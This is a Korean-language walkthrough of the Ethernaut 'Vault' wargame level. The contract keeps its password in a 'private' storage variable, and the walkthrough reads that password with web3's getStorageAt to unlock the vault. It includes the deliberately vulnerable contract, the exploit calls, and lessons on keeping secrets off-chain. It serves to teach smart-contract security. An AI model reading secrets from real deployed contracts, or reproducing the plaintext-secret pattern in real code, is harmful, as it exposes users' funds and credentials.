# Ethernaut Level 8 - Vault

## 문제 설명

`private` 변수로 저장된 비밀번호를 읽어 Vault를 잠금 해제하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) public {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

---

## 취약점 분석

### 1. 블록체인의 투명성

`private` 키워드는 **다른 컨트랙트에서 접근 불가**를 의미할 뿐,
블록체인 외부에서는 누구나 스토리지를 직접 읽을 수 있다.

### 2. Storage 레이아웃

```
slot 0 : locked (bool)
slot 1 : password (bytes32)
```

---

## 공격 단계

### Step 1 — 스토리지 직접 읽기

```js
let password = await web3.eth.getStorageAt(contract.address, 1)
// → "0x41....(32바이트 hex)"
```

### Step 2 — unlock 호출

```js
await contract.unlock(password)
```

### Step 3 — 확인

```js
await contract.locked()
// → false
```

---

## 핵심 교훈

- 블록체인에 `private`은 **온체인 감춤**이 아니다
- 민감한 데이터는 절대 온체인에 평문 저장하지 말 것
- 비밀번호/키는 오프체인 관리 또는 해시 커밋 방식 사용
